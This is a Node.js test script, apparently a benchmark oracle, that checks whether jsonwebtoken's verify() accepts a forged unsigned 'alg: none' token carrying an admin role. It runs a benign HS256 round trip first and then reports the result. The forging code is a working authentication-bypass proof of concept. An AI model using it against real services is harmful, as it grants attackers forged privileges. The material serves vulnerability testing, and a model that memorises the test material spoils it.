'use strict';
const jwt = require('jsonwebtoken');

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = 'JWT_ORACLE_' + Date.now() + '_' + Math.random().toString(36).slice(2);

    // Symmetric secret, as used by a typical server that signs and verifies
    // tokens with jwt.sign(payload, secret) / jwt.verify(token, secret)
    // WITHOUT explicitly pinning `algorithms` on verify (a very common,
    // historically-default usage pattern).
    const secret = 'super-secret-hmac-key-' + marker;

    // --- Benign operation first: normal HS256 sign/verify roundtrip. ---
    const benignToken = jwt.sign({ marker, role: 'user' }, secret, { algorithm: 'HS256' });
    const benignDecoded = jwt.verify(benignToken, secret);

    if (!benignDecoded || benignDecoded.marker !== marker || benignDecoded.role !== 'user') {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign HS256 sign/verify roundtrip failed to produce expected payload.'
      }));
      return;
    }

    operation_completed = true;

    // --- Malicious attempt: 'none' algorithm bypass. ---
    // An attacker who intercepts a legitimate token (or merely knows its
    // structure/claims) forges an unsigned JWT by setting header.alg to
    // 'none' and supplying an empty signature. If the verifier relies on
    // jwt.verify(token, secret) without explicitly restricting `algorithms`
    // to exclude 'none', and the insecure default algorithm handling allows
    // 'none' tokens through, the forged token is accepted without any valid
    // signature check, granting the attacker arbitrary claims (role: 'admin').
    const forgedHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const forgedPayload = Buffer.from(JSON.stringify({ marker, role: 'admin' })).toString('base64url');
    const forgedToken = forgedHeader + '.' + forgedPayload + '.';

    try {
      const forgedDecoded = jwt.verify(forgedToken, secret);

      if (forgedDecoded && forgedDecoded.marker === marker && forgedDecoded.role === 'admin') {
        exploit_succeeded = true;
        evidence = 'jwt.verify() accepted a forged "alg: none" unsigned token, decoding payload: ' + JSON.stringify(forgedDecoded);
      } else {
        exploit_succeeded = false;
        evidence = 'jwt.verify() returned an unexpected result for forged none-alg token: ' + JSON.stringify(forgedDecoded);
      }
    } catch (verifyErr) {
      exploit_succeeded = false;
      evidence = 'Forged "alg: none" token was rejected by jwt.verify(): ' + (verifyErr && verifyErr.message ? verifyErr.message : String(verifyErr));
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
    }));
  }
}

main();
